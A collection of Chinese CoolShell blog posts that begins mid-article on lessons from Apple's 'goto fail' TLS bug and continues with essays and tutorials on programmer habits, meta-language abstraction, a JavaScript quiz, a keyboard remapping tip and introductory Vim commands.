也就是说，在重构分支上的代码是对的，但是在分支merge的时候，被merge工具搞乱了。所以说， **我们在做code merge的时候，一定要小心小心再小心，不能完全相信merge工具** 。##### 2）关于测试很明显，这个bug很难被code review发现。对于重构代码和代码merge里众多的diff，是很难被review的。当然，“事后诸葛亮”的人们总是很容易地说这个问题可以被测试发现，但是实际情况是这样的吗？这个问题也很难被功能测试发现，因为这个函数在是在网络握手里很深的地方，功能 测试不一定能覆盖得那么深，你要写这样的case，必需对TLS的协议栈非常熟悉，熟悉到对他所有的参数都很熟悉，并能写出针对每一个参数以及这些参数的组合做一堆test case，这个事情也是一件很复杂的事。要写出所有的case本身就是一件很难很难的事情。关于这个叫SSLVerifySignedServerKeyExchange()函数的细节，你可以看看相关的ServerKeyExchange RFC文档。如果只看这个问题的话，你会说对这个函数做的 Unit Test 可以发现这个问题，是的。但是，别忘了SSL/TLS这么多年了，这些基础函数都应该是很稳定的了， 在事前，我们可能不会想到要去为这些稳定了多少年的函数写几个Unit Test。
**只要有足够多的时间，我们是可以对所有的功能点，所有的函数都做UT，也可以去追求做代码覆盖和分支覆盖一样。但有一点我们却永远无法做到，那就是——穷举所有的负面案例** 。所以，对于测试来说，我们不能走极端，需要更聪明的测试。就像我在《我们需要专职的QA》文章里的说过的—— **测试比coding难度大多了，测试这个工作只有高级的开发人员才做得好。我从来不相信不写代码的人能做好测试。**这里， **我并不是说通过测试来发现这个问题的可能性不大，我想说的是，测试很重要，单测更重要。但是，我们无法面面俱到** 。在我们没有关注到的地方，总会发生愚蠢的错误。P.S.，在各大网站对这个事的讨论中，我们可以看到OS X下的curl命令居然可以接受一个没有验证过的IP地址的https的请求，虽然现在还没有人知道这事的原因，但是，这可能是没有在测试中查到的一个原因。##### 3）关于编码风格对于程序员来说，在C语言中，省掉语句大括号是一件非常不明智 的事情。如我们强制使用语句块括号，那么，这两个goto fail都会在一个if的语句块里，而且也容易维护并且易读。（另外，通过这个bug，我们可以感受到，像Python那样，用缩进来表示语句块，的确是挺好的一件事）
也有人说，如果你硬要用只有单条语句，且不用语句块括号，那么，这就是一条语句，应该放在同一行上。如下所示：`if (check_something) do_something(); `但是这样一来，你在单步调试代码的时候，就有点不爽了，当你step over的时候，你完全不知道if的条件是真还是假。所以，还是分多行，加上大括号会好一些。相似的问题，我很十多年前也犯过，而且那次我出的问题也比较大，导致了用户的数据出错。那次就是维护别人的代码，别人的代码就是没有if的语句块括号，就像苹果的代码那样。我想在return z之前调用一个函数，结果就杯具了：if ( ...... )     return x;     if ( ...... )     return y;     if ( ...... )     foo();     return z;这个错误一不小心就犯了，因为人的大脑会相当然地认为缩进的都是一个语句块里的。但是如果原来的代码都加上了大括号，然后把缩进做正常，那么对后面维护的人会是一个非常好的事情。就不会犯我这个低级错误了。就像下面的代码一样，虽然写起来有点罗嗦，但利人利己。
与此类似的代码风格还有如下，你觉得哪个更容易阅读呢？* if (!p) 和 if (p == NULL)* if (p) 和 if (p != NULL)* if (!bflag) 和 if (bflag == false)* if ( CheckSomthing() ) 和 if ( CheckSomething() == true )另外还有很多人在switch 语句里用case来做if，也就是说case后面没有break。就像Duff’s Device一样，再配以goto，代码就写得相当精彩了（这里有个例子）所以说，代码不是炫酷的地方是给别人读的。另外，我在想，为什么苹果的这段代码不写成下面这样的形式？你看，下面这种情况不也很干净吗？goto fail;     }其实，还可以做一些代码上的优化，比如，把fail标签里的那些东西写成一个宏，这样就可以去掉goto语句了。##### 4）关于goto语句关于goto语句，1968年，Edsger Dijkstra 投了一篇文章到Communications of the ACM。原本的标题是《A Case Against the Goto Statement》。CACM编辑Niklaus Wirth灵感来了，把标题改为我们熟知的 《Go To Statement Considered Harmful》Dijkstra写的内容也是其一贯的犀利语气，文中说：“几年前我就观察到，一个程序员的品质是其程序中goto语句的密度成反比的”，他还说，“后来我发现了为什么goto语句的使用有这么严重的后果，并相信所有高级语言都应该把goto废除掉。” （ **花絮** ：因为，这篇文章的出现，计算学界开始用’ X considered harmful ‘当文章标题的风潮，直到有人终于受不了为止）
为什么goto语句不好呢？Dijkstra说，一个变量代表什么意义要看其上下文。一个程序用N``记录房间里的人数，在大部分时候，N``代表的是“目前房间里的人”。但在观察到又有一个人进房间后、把N``递增的指令前的这段程序区块中，N``的值代表的是“目前房间里的人数加一”。因此，要正确诠释程序的状态，必须知道程序执行的历史，或着说，知道现在“算到哪”了。怎么谈“算到哪了”？如果是一直线执行下来的程序，我们只要指到那条语句，说“就是这里”，就可以了。如果是有循环程序，我们可能得说：“现在在循环的这个地方，循环已经执行了第`i`次”。如果是在函数中，我们可能得说：“现在执行到函数`p`的这一点；`p`刚刚被`q调用`，调用点在一个循环中，这个循环已经执行了`i`次”。如果有goto`语句了`呢？那就麻烦了。因为电脑在执行某个指令前，可能是从程序中许许多多goto``其中之一跳过来的。要谈某变量的性质也几乎变得不可能了。这就是为什么goto语句问题。Dijkstra的这篇文章对后面很多程序员有非常深的影响，包括我在内，都觉得Goto语句能不用就不用，虽然，我在十年前的《编程修养》（这篇文章已经严重过时，某些条目已经漏洞百出）中的第23条也说过，我只认为在goto语句只有一种情况可以使用，就是苹果这个bug里的用法。但是我也同意Dijkstra，goto语句能不用就不用了。就苹果的这个问题而言，在更为高级的C++中，使用RAII技术，这样的goto语句已经没有什么存在的意义了。
Dijkstra这篇文章后来成为结构化程式论战最有名的文章之一。长达19年之后，Frank Rubin投了一篇文章到CACM,标题为《‘ ``Go To Considered Harmful’ Considered Harmful 》Rubin说，「虽然Dijkstra的说法既太学术又缺乏说服力」，却似乎烙到每个程序员的心里了。这样，当有人说“用goto语句来解这题可能会比较好”会被严重鄙视。于是Rubin出了一道这样的题：令`X`为`N * N`的整数阵列。如果`X`的第`i`行全都是零，请输出`i`。如果不只一行，输出最小的`i` .Rubin找了一些惯用goto和不用goto的程序员来解题，发现用goto的程序又快又清楚。而不用goto通常花了更多的时间，写出很复杂的解答。你觉得呢？ 另外，你会怎么写这题的程序呢？（ **花絮** ：以后几个月的CACM热闹死了。编辑收到许多回应，两个月后刊出了其中五篇。文章也包括了《“‘GOTO Considered Harmful’ Considered Harmful” Considered Harmful? 》）**对于我而言，goto语句的弊远远大于利，在99%的情况下，我是站在反goto这边的** 。Java和Python就没有提供Goto语句，原因就是因为goto语句很容易被滥用！
**更新：2014年3月5日** – RedHat 近日也发现个GnuTLS安全问题，与苹果的类似：无法正确检验特定的伪造SSL证书，这个总是会将伪造证书识别为有效证书。虽然Redhat的代码为if加上了花括号，但还是因为没有控制好goto，造成了bug。所以说啊，goto语句的坑是很多。* BUG页面：* 相关的Diff: https://bugzilla.redhat.com/attachment.cgi?id=867911&action=diffgoto语句在写代码的时候也许你会很爽，但是在维护的时候，绝对是一堆坑！redhat的这个patch为原来本来只有一个label的goto又加了另一个label，现在两个label交差goto，继续挖坑……#### 总结你看，我们不能完全消灭问题，但是，我们可以用下面几个手段来减少问题：1） **尽量在编译上发生错误，而不是在运行时** 。2） **代码是让人读的，顺便让机器运行** 。不要怕麻烦，好的代码风格，易读的代码会减少很多问题。3） **Code Review是一件很严肃的事情** ，但 Code Reivew的前提条件是代码的可读性一定要很好。
4） **测试是一件很重要也是很难的事情，尤其是开发人员要非常重视** 。5） **不要走飞线，用飞线来解决问题是可耻的！** 所以，用goto语句来组织代码的时代过去了，你可以有很多种方式不用goto也可以把代码组织得很好。最后，我在淘宝过去的一年里，经历过一些P1/P2故障，尤其是去年的8-9月份故障频发的月份，我发现其中有70%的P1/P2故障，就是因为没有code review，没有做好测试，大量地用飞线来解决问题，归根结底就是只重业务结果，对技术没有应有的严谨的态度和敬畏之心。**正如苹果的这个“goto fail”事件所暗喻的，如果你对技术没有应有的严谨和敬畏之心，你一定会——****Go To Fail !!!**在这里唠叨这么多，与大家共勉！（全文完）# 程序员惯用的解释(Top 25)作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是程序员日常工作当中惯用的解释，或是口头禅。我们可以从这一个侧面来看看的程序员的特征和性格，相信你我都说过很多这样的话。不要太认真哦，呵呵。1. 在我这边的电脑上可以工作啊……   2. 我重来没有听过这样的事   3. 昨天还能正常工作呢   4. 好吧，这算一个BUG   5. 这怎么可能？   6. 这应该是机器或是环境的问题
7. 操作系统更新了吗？   8. 一定又是用户那边的错   9. 你的测试数据一定有问题   10. 我从来没有碰过那边的代码！   11. 是的，是的，我会准备完成   12. 一定是你搞错了   13. 哦，这正是我们开发的功能   14. 我就快准备好了   15. 当然，还需要做的就只剩修改这些小Bug了。16. 我会马上做完的17. 最近太不顺了   18. 我不可能测试所有的case!   19. 那根本不可能做到   20. 我记得我已经改了这个bug了   21. 我做完了，只不过还没有测试过   22. 程序应该可以工作，只不过还没有测试过   23. 一定是有人改了我的代码   24. 你的机器上一定中了什么病毒或木马   25. 就算是程序有问题，那又怎么样？呵呵，是这样的吗？希望你能分享你所经历的程序员的解释。# 程序的本质复杂性和元语言抽象作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢@文艺复兴记（todd） 投递此文）**目录* 组件复用技术的局限性   * 程序的本质复杂性   * 元语言抽象   * 总结
#### 组件复用技术的局限性常听到有人讲“我写代码很讲究，一直严格遵循DRY原则，把重复使用的功能都封装成可复用的组件，使得代码简短优雅，同时也易于理解和维护”。显然，DRY原则和组件复用技术是最常见的改善代码质量的方法，不过，在我看来以这类方法为指导，能帮助我们写出“不错的程序”，但还不足以帮助我们写出简短、优雅、易理解、易维护的“好程序”。对于熟悉Martin Fowler《重构》和GoF《设计模式》的程序员，我常常提出这样一个问题帮助他们进一步加深对程序的理解：> 如果目标是代码“简短、优雅、易理解、易维护”，组件复用技术是最好的方法吗？这种方法有没有根本性的局限？虽然基于函数、类等形式的组件复用技术从一定程度上消除了冗余，提升了代码的抽象层次，但是这种技术却有着本质的局限性，其根源在于 **每种组件形式都代表了特定的抽象维度，组件复用只能在其维度上进行抽象层次的提升** 。比如，我们可以把常用的HashMap等功能封装为类库，但是不管怎么封装复用类永远是类，封装虽然提升了代码的抽象层次，但是它永远不会变成Lambda，而实际问题所代表的抽象维度往往与之并不匹配。以常见的二进制消息的解析为例，组件复用技术所能做到的只是把读取字节，检查约束，计算CRC等功能封装成函数，这是远远不够的。比如，下面的表格定义了二进制消息X的格式：
Message X:     --------------------------------------------------------     | ID |  Name           | Type    | Size | Constraints  |     --------------------------------------------------------     | 1  | message type    | int     | 1    | = 0x01       |     --------------------------------------------------------     | 2  | payload size    | int     | 2    | > 0          |     --------------------------------------------------------     | 3  | payload         | bytes   | <2>  |              |     --------------------------------------------------------     | 4  | CRC             | int     | 4    |              |     --------------------------------------------------------
它的解析函数大概是这个样子：很明显，虽然消息X的定义非常简单，但是它的解析函数却显得很繁琐，需要小心翼翼地处理很多细节。在处理其他消息Y时，虽然虽然Y和X很相似，但是却不得不再次在解析过程中处理这些细节，就是组件复用方法的局限性，它只能帮我们按照函数或者类的语义把功能封装成可复用的组件，但是消息的结构特征既不是函数也不是类，这就是抽象维度的失配。#### 程序的本质复杂性上面分析了组件复用技术有着根本性的局限性，现在我们要进一步思考：> > 如果目标还是代码“简短、优雅、易理解、易维护”，那么代码优化是否有一个理论极限？这个极限是由什么决定的？普通代码比起最优代码多出来的“冗余部分”到底干了些什么事情？回答这个问题要从程序的本质说起。Pascal语言之父Niklaus Wirth在70年代提出：Program = Data Structure + Algorithm，随后逻辑学家和计算机科学家R Kowalski进一步提出：Algorithm = Logic + Control。谁更深刻更有启发性？当然是后者！而且我认为数据结构和算法都属于控制策略，综合二位的观点，加上我自己的理解，程序的本质是：Program = Logic + Control。换句话说，程序包含了逻辑和控制两个维度。
逻辑就是问题的定义，比如，对于排序问题来讲，逻辑就是“什么叫做有序，什么叫大于，什么叫小于，什么叫相等”？控制就是如何合理地安排时间和空间资源去实现逻辑。逻辑是程序的灵魂，它定义了程序的本质；控制是为逻辑服务的，是非本质的，可以变化的，如同排序有几十种不同的方法，时间空间效率各不相同，可以根据需要采用不同的实现。程序的复杂性包含了本质复杂性和非本质复杂性两个方面。套用这里的术语， **程序的本质复杂性就是逻辑，非本质复杂性就是控制** 。逻辑决定了代码复杂性的下限，也就是说不管怎么做代码优化，Office程序永远比Notepad程序复杂，这是因为前者的逻辑就更为复杂。如果要代码简洁优雅，任何语言和技术所能做的只是尽量接近这个本质复杂性，而不可能超越这个理论下限。理解”程序的本质复杂性是由逻辑决定的”从理论上为我们指明了代码优化的方向：让逻辑和控制这两个维度保持正交关系。来看Java的Collections.sort方法的例子：使用者只关心逻辑部份，即提供一个Comparator对象表明序在类型T上的定义；控制的部分完全交给方法实现者，可以有多种不同的实现，这就是逻辑和控制解耦。同时，我们也可以断定，这个设计已经达到了代码优化的理论极限，不会有本质上比它更简洁的设计（忽略相同语义的语法差异），为什么？因为逻辑决定了它的本质复杂度，Comparator和Collections.sort的定义完全是逻辑的体现，不包含任何非本质的控制部分。
另外需要强调的是，上面讲的“控制是非本质复杂性”并不是说控制不重要，控制往往直接决定了程序的性能，当我们因为性能等原因必须采用某种控制的时候，实际上被固化的控制策略也是一种逻辑。比如，当你的需求是“从进程虚拟地址ptr1拷贝1024个字节到地址ptr2“，那么它就是问题的定义，它就是逻辑，这时，提供进程虚拟地址直接访问语义的底层语言就与之完全匹配，反而是更高层次的语言对这个需求无能为力。介绍了逻辑和控制的关系，可能很多朋友已经开始意识到了上面二进制文件解析实现的问题在哪里，其实这也是 **绝大多数程序不够简洁优雅的根本原因：逻辑与控制耦合** 。上面那个消息定义表格就是不包含控制的纯逻辑，我相信即使不是程序员也能读懂它；而相应的代码把逻辑和控制搅在一起之后就不那么容易读懂了。熟悉OOP和GoF设计模式的朋友可能会把“逻辑与控制解耦”与经常听说的“接口和实现解耦”联系在一起，他们是不是一回事呢？其实，把这里所说的逻辑和OOP中的接口划等号是似是而非的， 而GoF设计模式最大的问题就在于有意无意地让人们以为“what就是interface, interface就是what”，很多朋友一想到要表达what，要抽象，马上写个接口出来，这就是潜移默化的惯性思维，自己根本意识不到问题在哪里。其实，接口和前面提到的组件复用技术一样，同样受限于特定的抽象维度，它不是表达逻辑的通用方法，比如，我们无法把二进制文件格式特征用接口来表示。
另外，我们熟悉的许多GoF模式以“逻辑与控制解耦”的观点来看，都不是最优的。比如，很多时候Observer模式都是典型的以控制代逻辑，来看一个例子：> 对于某网页的超链接，要求其颜色随着状态不同而变化，点击之前的颜色是#FF0000，点击后颜色变成#00FF00。基于Observer模式的实现是这样的：[javascript]   $(a).css(‘color’, ‘#FF0000’);$(a).click(function() {   $(this).css(‘color’, ‘#00FF00’);   });   [/javascript]而基于纯CSS的实现是这样的：通过对比，您看出二者的差别了吗？显然，Observer模式包含了非本质的控制，而CSS是只包含逻辑。理论上讲，CSS能做的事情，JavaScript都能通过控制做到，那么为什么浏览器的设计者要引入CSS呢，这对我们有何启发呢？#### 元语言抽象好的，我们继续思考下面这个问题：> 逻辑决定了程序的本质复杂性，但接口不是表达逻辑的通用方式，那么是否存在表达逻辑的通用方式呢？答案是：有！这就是元(Meta)，包括元语言(Meta Language)和元数据(Meta Data)两个方面。元并不神秘，我们通常所说的配置就是元，元语言就是配置的语法和语义，元数据就是具体的配置，它们之间的关系就是C语言和C程序之间的关系；但是，同时元又非常神奇，因为元既是数据也是代码，在表达逻辑和语义方面具有无与伦比的灵活性。至此，我们终于找到了让代码变得简洁、优雅、易理解、易维护的终极方法，这就是： **通过元语言抽象让逻辑和控制彻底解耦** ！
比如，对于二进制消息解析，经典的做法是类似Google的Protocol Buffers，把消息结构特征抽象出来，定义消息描述元语言，再通过元数据描述消息结构。下面是Protocol Buffers元数据的例子，这个元数据是纯逻辑的表达，它的复杂度体现的是消息结构的本质复杂度，而如何序列化和解析这些控制相关的部分被Protocol Buffers编译器隐藏起来了。元语言解决了逻辑表达问题，但是最终要与控制相结合成为具体实现，这就是元语言到目标语言的映射问题。通常有这两种方法：1) 元编程(Meta Programming)，开发从元语言到目标语言的编译器，将元数据编译为目标程序代码；2) 元驱动编程(Meta Driven Programming)，直接在目标语言中实现元语言的解释器。这两种方法各有优势，元编程由于有静态编译阶段，一般产生的目标程序代码性能更好，但是这种方式混合了两个层次的代码，增加了代码配置管理的难度，一般还需要同时配备Build脚本把整个代码生成自动集成到Build过程中，此外，和IDE的集成也是问题；元驱动编程则相反，没有静态编译过程，元语言代码是动态解析的，所以性能上有损失，但是更加灵活，开发和代码配置管理的难度也更小。除非是性能要求非常高的场合，我推荐的是元驱动编程，因为它更轻量，更易于与目标语言结合。
下面是用元驱动编程解决二进制消息解析问题的例子，meta_message_x是元数据，parse_message是解释器：[javascript]   var meta_message_x = {   id: ‘x’,   fields: [   { name: ‘message_type’, type: int8, value: 0x01 },   { name: ‘payload_size’, type: int16 },   { name: ‘payload’, type: bytes, size: ‘$payload_size’ },   { name: ‘crc’, type: crc32, source: [‘message_type’, ‘payload_size’, ‘payload’] }   ]   }var message_x = parse_message(meta_message_x, data, size);   [/javascript]这段代码我用的是JavaScript语法，因为对于支持Literal的类似JSON对象表示的语言中，实现元驱动编程最为简单。如果是Java或C++语言，语法上稍微繁琐一点，不过本质上是一样的，或者引入JSON配置文件，然后解析配置，或者定义MessageConfig类，直接把这个类对象作为配置信息。
二进制文件解析问题是一个经典问题，有Protocol Buffers、Android AIDL等大量的实例，所以很多人能想到引入消息定义元语言，但是如果我们把问题稍微变换，能想到采用这种方法的人就不多了。来看下面这个问题：> > 某网站有新用户注册、用户信息更新，和个性设置等Web表单。出于性能和用户体验的考虑，在用户点击提交表单时，会先进行浏览器端的验证，比如：name字段至少3个字符，password字段至少8个字符，并且和repeat > password要一致，email要符合邮箱格式；通过浏览器端验证以后才通过HTTP请求提交到服务器。普通的实现是这个样子的：[javascript]   function check_form_x() {   var name = $(‘#name’).val();   if (null == name || name.length <= 3) {   return { status : 1, message: ‘Invalid name’ };   }var password = $(‘#password’).val();   if (null == password || password.length <= 8) {   return { status : 2, message: ‘Invalid password’ };   }
var repeat_password = $(‘#repeat_password’).val();   if (repeat_password != password.length) {   return { status : 3, message: ‘Password and repeat password mismatch’ };   }var email = $(‘#email’).val();   if (check_email_format(email)) {   return { status : 4, message: ‘Invalid email’ };   }…return { status : 0, message: ‘OK’ };}   [/javascript]上面的实现就是按照组建复用的思想封装了一下检测email格式之类的通用函数，这和刚才的二进制消息解析非常相似，没法在不同的表单之间进行大规模复用，很多细节都必须被重复编写。下面是用元语言抽象改进后的做法：[javascript]   var meta_create_user = {   form_id : ‘create_user’,   fields : [   { id : ‘name’, type : ‘text’, min_length : 3 },   { id : ‘password’, type : ‘password’, min_length : 8 },   { id : ‘repeat-password’, type : ‘password’, min_length : 8 },   { id : ’email’, type : ’email’ }   ]   };
var r = check_form(meta_create_user);   [/javascript]通过定义表单属性元语言，整个逻辑顿时清晰了，细节的处理只需要在check_form中编写一次，完全实现了“简短、优雅、易理解、以维护”的目标。其实，不仅Web表单验证可以通过元语言描述，整个Web页面从布局到功能全部都可以通过一个元对象描述，完全将逻辑和控制解耦。此外，我编写的用于解析命令行参数的lineparser.js库也是基于元语言的，有兴趣的朋友可以参考并对比它和其他命令行解析库的设计差异。最后，我们再来从代码长度的角度来分析一下元驱动编程和普通方法之间的差异。假设一个功能在系统中出现了n次，对于普通方法来讲，由于逻辑和控制的耦合，它的代码量是n * (L + C)，而元驱动编程只需要实现一次控制，代码长度是C + n * L，其中L表示逻辑相关的代码量，C表示控制相关的代码量。通常情况下L部分都是一些配置，不容易引入bug，复杂的主要是C的部分，普通方法中C被重复了n次，引入bug的可能性大大增加，同时修改一个bug也可能要改n个地方。所以，对于重复出现的功能，元驱动编程大大减少了代码量，减小了引入bug的可能，并且提高了可维护性。
#### 总结《人月神话》的作者Fred Brooks曾在80年代阐述了它对于软件复杂性的看法，即著名的No Silver Bullet。他认为不存在一种技术能使得软件开发在生产力、可靠性、简洁性方面提高一个数量级。我不清楚Brooks这一论断详细的背景，但是就个人的开发经验而言，元驱动编程和普通编程方法相比在生产力、可靠性和简洁性方面的确是数量级的提升,在我看来它就是软件开发的银弹！# 电子书：编译器设计基础作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这是一本关于编译器设计原理的书，让我又想起了大学时的《编译原理》还有那长篇长篇的作业，以及几个方法分析器的上机实习。现在基本上都全部还给老师了。Basics of Compiler Design**PDF下载**# 你能做对下面这些JavaScript的题吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn你能做对下面这些JavaScript的题吗？原文你认为你了解JavaScript? 快速的做一下下面的这些题目。并将下面的每一个表达式的值写出。(答案在问题后面)
1\. ++Math.PI   2\. (0.1 + 0.2) + 0.3 == 0.1 + (0.2 + 0.3)   3\. typeof NaN   4\. typeof typeof undefined   5\. a = {null:null}; typeof a.null;   6\. a = “5”; b = “2”; c = a * b;   7\. a = “5”; b = 2; c = a+++b;   8\. isNaN(1/null)   9\. (16).toString(16)   10.016 * 2   11.~null   12.”ab c”.match(/\b\w\b/)首先，这不是一个入门教程，因此我不会去对每一个答案做单独的解释，如果你觉得你有不理解的地方，我建议你 while (!掌握()) 专研它();答案：   1\. 4.141592653589793   2\. false   3\. “number”   4\. “string”   5\. “object”   6\. 10   7\. 7   8\. false   9\. 10   10\. 28   11\. -1   12\. [ “c” ]
我的打分如下(每答对一题一分)：5分 – 7分: 了解javascript   8分 – 10分: 专家   11: 大学士   12分: 大师简要的注释：   第2题：答案是false，javascript和java非常相似(或则其他使用了IEEE 754浮点数的语言)，这也是为什么在和钱打交道的正式应用程序中一般不使用浮点数四则运算的原因，浮点数的加或乘除外，下面这篇文章有关于浮点数四则运算的一个详细的讨论。第6题：在四则运算表达式中使用乘、除或减，如果表达式中包含一个或多个字符型，那么语法解释器会试着首先将字符型转换为数值型，如果算术表达式包含着加号运算，那么所有的运算项都会被转换成字符型。第7题：JavaScript中表达式的运算的优先级是从坐到右(类似于Java和C)，因此，在这里将会是一个先a计算值，加上b，然后在a++的次序，而不是a加上++b这样的运算。第9题：toString() 可以带一个可选的数字参数。参数值16意味着基于16进制，返回的字符串将会是该数字的16进制表示，在这个例子里面就是10，如果你写.toString(2)那么你将会得到这个数字的2进制表示，等等。
第10题：016是8进制表示，即8进制的14。虽然是这样，但比较有趣的是，如果有你以”016″(字符串形式)去乘上一个数，语法解释器会认为”016″是基于10进制的数。如果你不能正确的写出这些题目的答案，不要灰心丧气，因为几乎上面的每一个问题都(明显地)含有着蒙蔽人小伎俩，现在让我问面对它。当然，如果你非常正确的回答了上面的所有问题，你也不必太过沾沾自喜，这意味着这你仅仅是一个比任何正常人都奇怪的javascript怪杰而已！# 程序员版的凡客作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn现在“凡客诚品”的PS风已经成为了一场运动，详见这里：。这两天，公司内部要出期刊，正好下班没事，于是跟着这股网风，为公司的期刊做了一个插图，那些语句着实花了我很多时间。用PPT乱做的，希望大家喜欢。呵呵。欢迎你留下你的版本，尤其是那些语句。# Did You Know?作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这个短片可能Too Old了，不过我今天才看到，很不错，转到这里，让更多的人都能看到。这是个信息爆炸飞速发展的年代，逆水行舟，不进则退。在这一组组的数据中让我们这班新生代年轻人反思自身所要背负和面对的压力和挑战！极有深度的短片，整理出来的数据实在是叫人震惊，生活在这个科技高速发展的时代既是种荣幸，又很有压力，对“学校里教得知识很多就是过时的”深有体会！！
**Did You Know? 3.0版****Did You Know? 4.0版**# 如何修改微软人体工学键盘的Zoom键作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn如果你不是订阅本站的用户，你很肯能可能是通过搜索引擎的魔力来到本文的。微软的软件产品咱们暂且不谈，他们生产的键盘鼠标确实很不错。例如，经典的 microsoft natural ergonomic keyboard 4000 （见图）。著名Google工程师博主Matt Cutts用的就是这个（参考链接）。可是每个入手该键盘的geek都会觉得，这个弱智的设计师把zoom键放在中间干嘛，应该用来当上下滚轮嘛。无独有偶，该问题已经被先辈们解决，笔者只搜到了英文文章为了让中文读者方便找到并使用，暂且将关键步骤翻译如下：1. 下载微软键盘驱动    2. 找到command.xml文件，应该是在 C:\Program Files\Microsoft IntelliType Pro\   3. 编辑command.xml文件（建议之前备份），替换 **所有** <C319 Type=”6″ Activator=”ZoomIn” /> 为<C319 Type=”6″ Activator=”ScrollUp” /> **, 所有** <C320 Type=”6″ Activator=”ZoomOut” /> 替换为 ** <C320 Type=”6″ Activator=”ScrollDown” /> **用Notepad或者记事本可以实现，应该是10个左右。   4. 重启电脑（貌似这一步不能省）
图例：修改前图例：修改后这样你就可以用Zoom来替代鼠标滚轮了。# 简明 Vim 练级攻略作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnvim的学习曲线相当的大（参看各种文本编辑器的学习曲线），所以，如果你一开始看到的是一大堆VIM的命令分类，你一定会对这个编辑器失去兴趣的。下面的文章翻译自《Learn Vim Progressively》，我觉得这是给新手最好的VIM的升级教程了，没有列举所有的命令，只是列举了那些最有用的命令。非常不错。——————————正文开始——————————你想以最快的速度学习人类史上最好的文本编辑器VIM吗？你先得懂得如何在VIM幸存下来，然后一点一点地学习各种戏法。Vim the Six Billion Dollar editor> Better, Stronger, Faster.学习 vim 并且其会成为你最后一个使用的文本编辑器。没有比这个更好的文本编辑器了，非常地难学，但是却不可思议地好用。我建议下面这四个步骤：1. 存活   2. 感觉良好   3. 觉得更好，更强，更快   4. 使用VIM的超能力
当你走完这篇文章，你会成为一个vim的 superstar。在开始学习以前，我需要给你一些警告：* 学习vim在开始时是痛苦的。   * 需要时间   * 需要不断地练习，就像你学习一个乐器一样。   * 不要期望你能在3天内把vim练得比别的编辑器更有效率。   * 事实上，你需要2周时间的苦练，而不是3天。目录* 第一级 – 存活   * 第二级 – 感觉良好   * 第三级 – 更好，更强，更快     * 更好     * 更强     * 更快   * 第四级 – Vim 超能力     * 在当前行上移动光标: 0 ^ $ f F t T , ;     * 区域选择 <action>a<object> 或 <action>i<object>     * 块操作: <C-v>     * 自动提示： <C-n> 和 <C-p>     * 宏录制： qa 操作序列 q, @a, @@     * 可视化选择： v,V,<C-v>     * 分屏: :split 和 vsplit.   * 结束语#### 第一级 – 存活1. 安装 vim   2. 启动 vim   3. **什么也别干！** 请先阅读
当你安装好一个编辑器后，你一定会想在其中输入点什么东西，然后看看这个编辑器是什么样子。但vim不是这样的，请按照下面的命令操作：* 启 动Vim后，vim在 _Normal_ 模式下。   * 让我们进入 _Insert_ 模式，请按下键 i 。(陈皓注：你会看到vim左下角有一个–insert–字样，表示，你可以以插入的方式输入了）   * 此时，你可以输入文本了，就像你用“记事本”一样。   * 如果你想返回 _Normal_ 模式，请按 `ESC` 键。现在，你知道如何在 _Insert_ 和 _Normal_ 模式下切换了。下面是一些命令，可以让你在 _Normal_ 模式下幸存下来：>   * `i` → _Insert_ 模式，按 `ESC` 回到 _Normal_ 模式. >   * `x` → 删当前光标所在的一个字符。 >   * `:wq` → 存盘 + 退出 (`:w` 存盘, `:q` 退出) （陈皓注：:w 后可以跟文件名） >   * `dd` → 删除当前行，并把删除的行存到剪贴板里 >   * `p` → 粘贴剪贴板 >> > **推荐** : > >   * `hjkl` (强例推荐使用其移动光标，但不必需) →你也可以使用光标键 (←↓↑→). 注: `j` 就像下箭头。 >   * `:help <command>` → 显示相关命令的帮助。你也可以就输入 `:help` 而不跟命令。（陈皓注：退出帮助需要输入:q） >
你能在vim幸存下来只需要上述的那5个命令，你就可以编辑文本了，你一定要把这些命令练成一种下意识的状态。于是你就可以开始进阶到第二级了。当是，在你进入第二级时，需要再说一下 _Normal_ 模式。在一般的编辑器下，当你需要copy一段文字的时候，你需要使用 `Ctrl` 键，比如：`Ctrl-C`。也就是说，Ctrl键就好像功能键一样，当你按下了功能键Ctrl后，C就不在是C了，而且就是一个命令或是一个快键键了， **在VIM的Normal模式下，所有的键就是功能键了** 。这个你需要知道。标记:* 下面的文字中，如果是 `Ctrl-λ`我会写成 `<C-λ>`.   * 以 `:` 开始的命令你需要输入 `<enter>`回车，例如 — 如果我写成 `:q` 也就是说你要输入 `:q<enter>`.#### 第二级 – 感觉良好上面的那些命令只能让你存活下来，现在是时候学习一些更多的命令了，下面是我的建议：（陈皓注：所有的命令都需要在Normal模式下使用，如果你不知道现在在什么样的模式，你就狂按几次ESC键）1. **各种插入模式**>     * `a` → 在光标后插入 >     * `o` → 在当前行后插入一个新行 >     * `O` → 在当前行前插入一个新行 >     * `cw` → 替换从光标所在位置后到一个单词结尾的字符
2. **简单的移动光标**>     * `0` → 数字零，到行头 >     * `^` → 到本行第一个不是blank字符的位置（所谓blank字符就是空格，tab，换行，回车等） >     * `$` → 到本行行尾 >     * `g_` → 到本行最后一个不是blank字符的位置。 >     * `/pattern` → 搜索 `pattern` 的字符串（陈皓注：如果搜索出多个匹配，可按n键到下一个）3. **拷贝/粘贴** （陈皓注：p/P都可以，p是表示在当前位置之后，P表示在当前位置之前）>     * `P` → 粘贴 >     * `yy` → 拷贝当前行当行于 `ddP`4. **Undo/Redo**>     * `u` → undo >     * `<C-r>` → redo5. **打开/保存/退出/改变文件** (Buffer)>     * `:e <path/to/file>` → 打开一个文件 >     * `:w` → 存盘 >     * `:saveas <path/to/file>` → 另存为 `<path/to/file>` >     * `:x`， `ZZ` 或 `:wq` → 保存并退出 (`:x` 表示仅在需要时保存，ZZ不需要输入冒号并回车) >     * `:q!` → 退出不保存 `:qa!` 强行退出所有的正在编辑的文件，就算别的文件有更改。 >     * `:bn` 和 `:bp` → 你可以同时打开很多文件，使用这两个命令来切换下一个或上一个文件。（陈皓注：我喜欢使用:n到下一个文件）
